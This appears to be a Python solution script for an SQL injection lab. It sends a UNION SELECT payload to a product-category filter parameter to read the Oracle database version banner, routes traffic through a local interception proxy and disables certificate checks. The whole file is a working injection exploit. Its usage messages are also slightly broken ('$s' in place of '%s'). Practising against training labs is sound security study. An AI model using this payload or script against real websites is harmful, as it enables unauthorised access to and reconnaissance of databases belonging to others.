import requests
import sys
import urllib3
from bs4 import BeautifulSoup as BS
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_version(url):
    path = '/filter?category='
    sql_payload = "' UNION SELECT banner, NULL FROM v$version--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "Oracle Database" in res:
        print('[+] Found the database version.')
        soup = BS(r.text, 'html.parser')
        version = soup.find(text=re.compile('.*Oracle\sDatabase.*')) # \s represent a space
        print('[+] The Oracle Database version is: ' + version)
        return True
    return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: $s <url>' % sys.argv[0])
        print('[-] Example: $s www.example.com' % sys.argv[0])
        sys.exit(-1)
    
    print('[+] Dumping the version of the database...')
    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version.")

